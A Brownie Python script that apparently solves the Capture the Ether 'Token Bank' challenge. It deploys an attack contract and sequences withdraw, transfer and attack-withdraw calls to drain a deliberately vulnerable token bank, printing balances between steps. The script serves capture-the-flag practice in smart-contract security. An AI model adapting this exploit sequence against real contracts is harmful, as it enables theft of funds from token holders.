from brownie import (
    network,
    accounts,
    config,
    interface,
    chain,
    Contract,
    TokenBankChallenge,
    TokenBankAttack
)
from scripts.helpful_scripts import (
    get_account,
    get_challenge_contract,
    check_solution,
    get_web3
)
from web3 import Web3


def main():
    player = get_account("player")
    non_player = get_account("non_player")
    challenge_contract = get_challenge_contract(TokenBankChallenge, "token_bank", [player], {"from": non_player})
    token_contract = interface.ISimpleERC223Token(challenge_contract.token())
    attack_contract = TokenBankAttack.deploy(token_contract, challenge_contract, {"from": player})

    print_balances(challenge_contract, player, non_player, attack_contract)

    tx = challenge_contract.withdraw(challenge_contract.balanceOf(player), {"from": player})
    tx.wait(1)

    print_balances(challenge_contract, player, non_player, attack_contract)

    tx = token_contract.transfer(attack_contract, token_contract.balanceOf(player), {"from": player})
    tx.wait(1)

    print_balances(challenge_contract, player, non_player, attack_contract)

    tx = attack_contract.withdraw({"from": player})
    tx.wait(1)

    print_balances(challenge_contract, player, non_player, attack_contract)

    check_solution(challenge_contract)

def print_balances(challenge_contract, player, non_player, attack_contract):
    token_contract = interface.ISimpleERC223Token(challenge_contract.token())

    print("Bank balances:")
    _print_balances(challenge_contract, challenge_contract, player, non_player, attack_contract)
    print("Token balances:")
    _print_balances(token_contract, challenge_contract, player, non_player, attack_contract)

def _print_balances(contract, challenge_contract, player, non_player, attack_contract):
    print("Bank:", Web3.fromWei(contract.balanceOf(challenge_contract), "ether"))
    print("Non player:", Web3.fromWei(contract.balanceOf(non_player), "ether"))
    print("Player:", Web3.fromWei(contract.balanceOf(player), "ether"))
    print("Attack contract:", Web3.fromWei(contract.balanceOf(attack_contract), "ether"))
    print()